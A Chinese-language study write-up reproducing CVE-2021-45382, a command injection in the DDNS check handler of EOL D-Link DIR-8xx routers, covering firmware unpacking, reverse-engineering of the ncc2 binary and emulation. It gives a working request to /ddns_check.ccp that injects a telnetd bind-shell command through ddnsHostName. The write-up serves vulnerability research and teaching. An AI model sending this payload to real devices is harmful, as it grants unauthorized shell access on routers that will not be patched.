
# 命令注入漏洞CVE-2021-45382复现（学习记录）

### 0x01 漏洞信息

- CVE编号：CVE-2021-45382
- 漏洞描述：A Remote Command Execution (RCE) vulnerability exists in all series H/W revisions D-link DIR-810L, DIR-820L/LW, DIR-826L, DIR-830L, and DIR-836L routers via the DDNS function in ncc2 binary file. Note: DIR-810L, DIR-820L, DIR-830L, DIR-826L, DIR-836L, all hardware revisions, have reached their End of Life ("EOL") /End of Service Life ("EOS") Life-Cycle and as such this issue will not be patched.
- 设备型号： D-Link DIR-830L
- 固件版本：FW1.00.B07 (Release)
- 厂商官网：elink@bfcK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3c8D9K9h3&6C8i4K6u0W2j5$3!0E0i4K6u0W2j5$3&6Q4x3V1j5`.
- 固件地址：legacyfiles.us.dlink.com - /DIR-830L/REVA/FIRMWARE/

> 这个漏洞影响的版本较多：DIR-810L、DIR-820L、DIR-826L、DIR-830L、DIR-836L。很好奇这个漏洞怎么做到没有被及时发现，影响到这么多个版本的。同时也希望通过分析发现新的命令注入可能存在的漏洞点。

### 0x02 固件分析

#### 2.1 固件解包

使用`binwalk`解包，获取固件文件系统：

```bash
binwalk -Me DIR810LA1\_FW102B22.bin
```

![](upload/attach/202307/882513\_MZ8PHJDM8FBKWZN.png)

查看一下启动文件：

![](upload/attach/202307/882513\_G3TSXVQR8U76P99.png)

查看一下二进制文件，发现存在`telnet`、`telnetd`和`wget`可用于漏洞验证：

![](upload/attach/202307/882513\_HG7WKKUZMNRWVFM.png)

#### 2.2 文件分析

在漏洞描述中详细的说明漏洞存在于`ncc2`文件中的DDNS函数中，直接在文件系统中查找`ncc2`文件：

![](upload/attach/202307/882513\_SZN9YWKMTH6E5J8.png)

将`sbin/ncc`文件拿到IDA中分析，直接查找`ddns`函数，定位到关键函数并在`doCheck`函数中找到漏洞点：

![](upload/attach/202307/882513\_M7SKF2DYXJRYB5P.png)

上述代码含义为：判断`ccp_act`的值是否为`doCheck`，若为`doCheck`则调用`doCheck`函数检查参数。

![](upload/attach/202307/882513\_F64YXS2XZPEDFRS.png)

查找`get_entry_value_by_name`和`__system`函数的实现：

![](upload/attach/202307/882513\_CRCN3CW5V8RWWSD.png)

![](upload/attach/202307/882513\_92WMFK8CB4R5Z7S.png)

上述代码含义是：通过`get_entry_value_by_name`获取`ddnsHostName`、`ddnsUsername`、`ddnsPassword`的值并将其传入到`__system`中拼接执行。在这个过程中并没有对从前端输入的数据进行过滤或者检查，因此导致了命令注入漏洞。`ddnsHostName`、`ddnsUsername`、`ddnsPassword`的值是通过`ddns_check.ccp`传入。综上可知大概的payload如下：

```html
POST /ddns_check.ccp HTTP/1.1
...
ccp_act=doCheck&ddnsHostName=xxxx&ddnsUsername=xxxx&ddnsPassword=xxxx
```

### 0x03 漏洞复现

#### 3.1 模拟固件

使用FirmAE模拟固件：

![](upload/attach/202307/882513\_8UANUPU2HNPXR5D.png)

![](upload/attach/202307/882513\_4U5R64YQ3PF3VBH.png)

默认密码为空，直接登录即可。

#### 3.2 改包验证

登录后，抓包改包验证漏洞：

![](upload/attach/202307/882513\_8F8NAXJT3WW5ZAM.png)

将`GET /Home.html HTTP/1.1`改为：
`POST /ddns_check.ccp HTTP/1.1`
...
在包体中添加：
`ccp_act=doCheck&ddnsHostName=;/bin/telnetd -l /bin/sh -p 7080 -b 0.0.0.0;&ddnsUsername=xxxx&ddnsPassword=xxxx`

复现成功，取得shell：

![](upload/attach/202307/882513\_4KE6ERQAQJ6BDS9.png)

### 0x04 复现总结

这个命令执行漏洞没有后台页面存在，是直接POST 数据到`ddns_check.ccp`交给后端处理，处理好之后将结果返回给用户。因而比较隐蔽不容易被发现，需要通过逆向`ncc2`文件才能发现其端倪。感觉很奇怪，为什么要留一个不提供用户接口的`ddns_check`功能，虽然在`www`文件夹下发现了一个`DynamicDNS.html`页面，并且`ddns`看命名也像是和动态dns有关，但是设置动态dns默认是关闭的并且文件中也没有向URL：`/ddns_check.ccp`提交数据的代码。因此怀疑本漏洞所在功能是某个版本遗留功能。
